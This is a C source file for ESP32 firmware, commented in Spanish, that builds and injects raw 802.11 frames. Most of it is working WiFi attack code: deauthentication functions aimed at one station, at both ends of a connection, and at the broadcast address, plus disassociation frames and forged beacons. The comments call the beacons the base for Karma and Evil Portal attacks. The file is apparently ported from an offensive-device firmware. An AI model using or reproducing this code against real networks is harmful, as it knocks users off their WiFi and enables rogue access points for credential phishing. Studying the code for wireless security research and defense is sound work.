/*
 * rf_inject.c — construccion y envio de tramas 802.11 crudas
 *
 * Todas las tramas se construyen a mano, byte a byte, y se envian con
 * esp_wifi_80211_tx(en_sys_seq=false): nosotros fijamos el sequence
 * number, que es lo que permite hacer flood controlado y predecible.
 *
 * Es lo que en Bruce estaba disperso entre deauther.cpp y wifi_atks.cpp,
 * pero aqui es una funcion por tipo de trama y sin una linea de Arduino.
 */
#include <string.h>
#include <stdint.h>

#include "esp_log.h"
#include "esp_wifi.h"

#include "rf_core.h"


/* offsets de cabecera 802.11 */
#define H_FC     0
#define H_DUR    2
#define H_A1     4
#define H_A2     10
#define H_A3     16
#define H_SEQ    22
#define H_LEN    24

static uint16_t s_seq = 0;

/* ------------------------------------------------------------------ */
static inline void put_fc(uint8_t *f, uint8_t type, uint8_t subtype)
{
    uint16_t fc = (uint16_t)(((uint16_t)subtype << 4) | ((uint16_t)type << 2));
    f[0] = (uint8_t)(fc & 0xFFu);
    f[1] = (uint8_t)(fc >> 8);
}

static inline void put_addr(uint8_t *f, uint8_t off, const uint8_t *mac)
{
    memcpy(f + off, mac, 6);
}

static inline void next_seq(uint8_t *f)
{
    uint16_t s = (uint16_t)((s_seq++ & 0x0FFFu) << 4);
    f[H_SEQ]     = (uint8_t)(s & 0xFFu);
    f[H_SEQ + 1] = (uint8_t)(s >> 8);
}

/* ------------------------------------------------------------------ */
/* Deauth / Disassoc                                                  */
/* ------------------------------------------------------------------ */
static esp_err_t send_mgmt26(uint8_t subtype, const uint8_t *a1,
                             const uint8_t *a2, const uint8_t *a3,
                             uint8_t reason)
{
    uint8_t f[26];
    memset(f, 0, sizeof(f));
    put_fc(f, RF_MGMT, subtype);
    put_addr(f, H_A1, a1);
    put_addr(f, H_A2, a2);
    put_addr(f, H_A3, a3);
    next_seq(f);
    f[24] = reason;
    f[25] = 0;
    return rf_tx_now(f, sizeof(f));
}

esp_err_t rf_deauth(const uint8_t *bssid, const uint8_t *sta, uint8_t reason)
{
    if (bssid == NULL || sta == NULL) return ESP_ERR_INVALID_ARG;
    return send_mgmt26(RF_SUB_DEAUTH, sta, bssid, bssid, reason);
}

/* Ambas direcciones: AP->STA y STA->AP. Duplica la efectividad real. */
esp_err_t rf_deauth_pair(const uint8_t *bssid, const uint8_t *sta, uint8_t reason)
{
    if (bssid == NULL || sta == NULL) return ESP_ERR_INVALID_ARG;
    esp_err_t e = send_mgmt26(RF_SUB_DEAUTH, sta, bssid, bssid, reason);
    send_mgmt26(RF_SUB_DEAUTH, bssid, sta, bssid, reason);   /* inverso */
    return e;
}

esp_err_t rf_deauth_bcast(const uint8_t *bssid, uint8_t reason)
{
    static const uint8_t bc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    if (bssid == NULL) return ESP_ERR_INVALID_ARG;
    return send_mgmt26(RF_SUB_DEAUTH, bc, bssid, bssid, reason);
}

esp_err_t rf_disassoc(const uint8_t *bssid, const uint8_t *sta, uint8_t reason)
{
    if (bssid == NULL || sta == NULL) return ESP_ERR_INVALID_ARG;
    return send_mgmt26(RF_SUB_DISASSOC, sta, bssid, bssid, reason);
}

/* ------------------------------------------------------------------ */
/* Beacon — la base de Karma y del Evil Portal                        */
/* ------------------------------------------------------------------ */
static const uint8_t RATES_IE[] = { 0x01, 0x08, 0x82, 0x84, 0x8B, 0x96,
                                    0x0C, 0x12, 0x18, 0x24 };
static const uint8_t RSN_IE[]   = { 0x30, 0x14, 0x01, 0x00,
                                    0x00, 0x0F, 0xAC, 0x04,   /* group CCMP  */
                                    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, /* pairwise */
                                    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, /* AKM PSK   */
                                    0x00, 0x00 };

size_t rf_beacon_build(uint8_t *out, size_t out_max, const char *ssid,
                       const uint8_t *bssid, uint8_t chan, bool wpa2)
{
    if (out == NULL || ssid == NULL || bssid == NULL) return 0;

    size_t ssid_len = strlen(ssid);
    if (ssid_len > 32u) ssid_len = 32u;

    size_t need = 36u + 2u + ssid_len + sizeof(RATES_IE) + 3u +
                  (wpa2 ? sizeof(RSN_IE) : 0u);
    if (need > out_max) return 0;

    memset(out, 0, 36u);

    put_fc(out, RF_MGMT, RF_SUB_BEACON);
    out[H_DUR] = 0x00; out[H_DUR + 1] = 0x00;      /* duration */
    memset(out + H_A1, 0xFF, 6);                   /* DA broadcast */
    put_addr(out, H_A2, bssid);
    put_addr(out, H_A3, bssid);
    next_seq(out);

    /* Fixed parameters: timestamp 8B ya en cero */
    out[32] = 0x64; out[33] = 0x00;                /* interval 100 TU */
    uint16_t cap = 0x0411u;                         /* ESS + short preamble */
    if (wpa2) cap |= 0x0010u;                       /* privacy */
    out[34] = (uint8_t)(cap & 0xFFu);
    out[35] = (uint8_t)(cap >> 8);

    size_t o = 36u;

    out[o++] = 0x00;                                /* SSID */
    out[o++] = (uint8_t)ssid_len;
    memcpy(out + o, ssid, ssid_len);
    o += ssid_len;

    memcpy(out + o, RATES_IE, sizeof(RATES_IE));    /* Supported rates */
    o += sizeof(RATES_IE);

    out[o++] = 0x03;                                /* DS Parameter Set */
    out[o++] = 0x01;
    out[o++] = chan;

    if (wpa2) {
        memcpy(out + o, RSN_IE, sizeof(RSN_IE));
        o += sizeof(RSN_IE);
    }
    return o;
}

esp_err_t rf_beacon_tx(const char *ssid, const uint8_t *bssid, uint8_t chan, bool wpa2)
{
    uint8_t f[128];
    size_t n = rf_beacon_build(f, sizeof(f), ssid, bssid, chan, wpa2);
    if (n == 0) return ESP_ERR_INVALID_ARG;
    return rf_tx_now(f, n);
}

/* ------------------------------------------------------------------ */
esp_err_t rf_auth_open(const uint8_t *bssid, const uint8_t *sta)
{
    uint8_t f[30];
    memset(f, 0, sizeof(f));
    put_fc(f, RF_MGMT, RF_SUB_AUTH);
    put_addr(f, H_A1, sta);
    put_addr(f, H_A2, bssid);
    put_addr(f, H_A3, bssid);
    next_seq(f);
    f[24] = 0x00; f[25] = 0x00;   /* auth algorithm: open system */
    f[26] = 0x01; f[27] = 0x00;   /* auth transaction seq 1       */
    f[28] = 0x00; f[29] = 0x00;   /* status: success              */
    return rf_tx_now(f, sizeof(f));
}
